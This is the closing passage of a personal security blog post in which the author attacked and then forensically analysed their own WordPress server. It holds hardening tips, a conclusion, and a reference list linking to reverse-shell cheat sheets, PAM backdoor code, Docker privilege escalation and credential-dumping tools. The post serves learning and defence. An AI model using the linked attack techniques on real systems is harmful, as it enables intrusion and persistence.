commands runs by <strong>www-data</strong> ;</li><li>Change SSH default port ;</li><li>Install an SSH honeypot on the default port.</li></ul><h1 id=conclusion>Conclusion</h1><p>To conclude this article, I really enjoyed doing it, I learned a lot of things, whether it was in blue team or red team. The main problem is that my point of view was completely biased since I was both the attacker and the attacked. I should be looking for someone who attacks a machine, makes a memory dump and sends it to me.</p><p>Moreover, it&rsquo;s a new system, which has no experience and no interaction with the internet. This system is completely prevented from external noise. This is why to was so &ldquo;easy&rdquo; to find all these artifacts despite the completely poor log configuration.</p><p>Some omissions like the docker container for privilege escalation are not done on purpose, I really forgot to delete the container! I realized this during the analysis of the memory dump.</p><p>I hope you will have learned some things as readers, and that it will motivate you to do these kinds of little exercises and write about it :D</p><p>If you have any questions about this article, advice about the methodology (blue or/and red team) or even just for chatting, feel free to contact me on Twitter: <a href=https://twitter.com/Maki_chaz target=_blank rel="noopener noreffer">Maki Twitter</a>.</p><p>Finally, I would like to be clear about the history between Monique and Odie. After all of that, Monique has stopped annoying Odie. They even going to see Aquaman together this weekend! They lived happily ever after and had many children! :)</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif data-srcset="https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif, https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif 1.5x, https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif title=https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif></p><h2 id=ressources>Ressources</h2><ul><li>Nick CONGLETON, <em>How to Install a LAMP Server on Debian 9 Stretch Linux</em>. 21/02/2018. <strong>Linux Config</strong>: <a href=https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux target=_blank rel="noopener noreffer">https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux</a></li><li>Nick CONGLETON, <em>How to Install WordPress on Debian 9 Stretch Linux</em>. 30/06/2017. <strong>Linux Config</strong>: <a href=https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux target=_blank rel="noopener noreffer">https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux</a></li><li>xfkxfk@, <em>SSRF To RCE in MySQL</em>. 23/01/2018. <strong>Seebug paper</strong>: <a href=https://paper.seebug.org/510/ target=_blank rel="noopener noreffer">https://paper.seebug.org/510/</a></li><li>Guilherme &ldquo;k33r0k&rdquo; Assmann, <em>ISITDTU CTF 2018 - Friss Writeup</em>. 29/07/2018. <strong>FireShell Security team</strong>: <a href=https://fireshellsecurity.team/isitdtu-friss/ target=_blank rel="noopener noreffer">https://fireshellsecurity.team/isitdtu-friss/</a></li><li>Officiel PHP website, <em>escapeshellarg</em>. <strong>PHP</strong>: <a href=http://php.net/manual/fr/function.escapeshellarg.php target=_blank rel="noopener noreffer">http://php.net/manual/fr/function.escapeshellarg.php</a></li><li>HollyGraceful, <em>Custom Rules for John the Ripper</em>. 14/09/2015. <strong>GracefulSecurity</strong>: <a href=https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/ target=_blank rel="noopener noreffer">https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/</a></li><li>PentestMonkey, <em>Reverse Shell Cheat Sheet</em>. <strong>PentestMonkey</strong>: <a href=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet target=_blank rel="noopener noreffer">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li><li>RopNop, <em>Upgrading simple shells to fully interactive TTYs</em>. 10/07/2017. <strong>RopNop blog</strong>: <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ target=_blank rel="noopener noreffer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></li><li>Python official website, <em>Command lind and environment</em>, <strong>Python officiel website</strong>: <a href=https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT target=_blank rel="noopener noreffer">https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT</a></li><li>Chris Foster, <em>Privilege escalation via Docker</em>. 22/04/2015. <strong>fosterelli</strong>: <a href=https://fosterelli.co/privilege-escalation-via-docker.html target=_blank rel="noopener noreffer">https://fosterelli.co/privilege-escalation-via-docker.html</a></li><li>Mitsurugi, <em>Creating a backdoor in PAM in 5 line of code</em>. 16/06/2016. <strong>Mitsurugi blog</strong>: <a href=http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html target=_blank rel="noopener noreffer">http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html</a></li><li>Zephrax, <em>linux-pam-backdoor</em>. 2016. <strong>GitHub</strong>: <a href=https://github.com/zephrax/linux-pam-backdoor target=_blank rel="noopener noreffer">https://github.com/zephrax/linux-pam-backdoor</a></li><li>504ensibsLabs, <em>LiME ~ Linux Memory Extractor</em>. 2018. <strong>GitHub</strong>: <a href=https://github.com/504ensicsLabs/LiME target=_blank rel="noopener noreffer">https://github.com/504ensicsLabs/LiME</a></li><li>Maki, <em>Volatility docker</em>. 2018. <strong>GitLab</strong>: <a href=https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility target=_blank rel="noopener noreffer">https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility</a></li><li>huntergregal, <em>Mimipenguin beta-2.0</em>. 2018. <strong>GitHub</strong>: <a href=https://github.com/huntergregal/mimipenguin target=_blank rel="noopener noreffer">https://github.com/huntergregal/mimipenguin</a></li><li>gleeda, <em>Linux command reference</em>. 20/12/2017. <strong>Volatility GitHub</strong>: <a href=https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference target=_blank rel="noopener noreffer">https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference</a></li><li>Wiki, <em>OWASP DirBuster Project</em>. <strong>OWASP Wiki</strong>: <a href=https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project target=_blank rel="noopener noreffer">https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project</a></li><li>Geluchat, <em>Les Server Side Request Forgery : Comment contourner un pare-feu</em>. 16/09/2017. <strong>DailySecurity</strong>: <a href=https://www.dailysecurity.fr/server-side-request-forgery/ target=_blank rel="noopener noreffer">https://www.dailysecurity.fr/server-side-request-forgery/</a></li><li>Swissky, <em>Server-Side Request Forgery</em>. <strong>GitHub</strong>: <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md target=_blank rel="noopener noreffer">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md</a></li><li>DFarnier, <em>Dbuter WordPress</em>. 01/03/2015. <strong>dfarnier</strong>: <a href=https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta target=_blank rel="noopener noreffer">https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta</a></li><li>chrisfosterelli, <em>chrisfosterelli/rootplease</em>. 2015. <strong>DockerHub</strong>: <a href=https://hub.docker.com/r/chrisfosterelli/rootplease/ target=_blank rel="noopener noreffer">https://hub.docker.com/r/chrisfosterelli/rootplease/</a></li><li>cowrie, <em>Cowrie SSH/Telnet Honeypot</em>. 2018. <strong>GitHub</strong>: <a href=https://github.com/cowrie/cowrie target=_blank rel="noopener noreffer">https://github.com/cowrie/cowrie</a></li><li>SekioaLab, <em>FastIR Collector Linux</em>. 2017. <strong>GitHub</strong>: <a href=https://github.com/SekoiaLab/Fastir_Collector_Linux target=_blank rel="noopener noreffer">https://github.com/SekoiaLab/Fastir_Collector_Linux</a></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2019-12-27</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=maki.bzh/realgsmoveinsilencelikelasagna/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=maki.bzh/realgsmoveinsilencelikelasagna/ data-title="Real Gs move in silence like lasagna" data-via=maki_mitz data-hashtags="methodology,blue team,red team,forensic,pentest,web,docker,ssrf,garfield"><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=maki.bzh/realgsmoveinsilencelikelasagna/ data-title="Real Gs move in silence like lasagna"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=maki.bzh/realgsmoveinsilencelikelasagna/ data-title="Real Gs move in silence like lasagna"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on " data-sharer=weibo data-url=maki.bzh/realgsmoveinsilencelikelasagna/ data-title="Real Gs move in silence like lasagna"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=maki.bzh/tags/methodology/>methodology</a>,&nbsp;<a href=maki.bzh/tags/blue-team/>blue team</a>,&nbsp;<a href=maki.bzh/tags/red-team/>red team</a>,&nbsp;<a href=maki.bzh/tags/forensic/>forensic</a>,&nbsp;<a href=maki.bzh/tags/pentest/>pentest</a>,&nbsp;<a href=maki.bzh/tags/web/>web</a>,&nbsp;<a href=maki.bzh/tags/docker/>docker</a>,&nbsp;<a href=maki.bzh/tags/ssrf/>ssrf</a>,&nbsp;<a href=maki.bzh/tags/garfield/>garfield</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=maki.bzh/>Home</a></span></section></div><div class=post-nav><a href=maki.bzh/feedbackecsc2018/ class=prev rel=prev title="Feeback of European CyberSecurity Challenge 2018 final CTF"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Feeback of European CyberSecurity Challenge 2018 final CTF</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>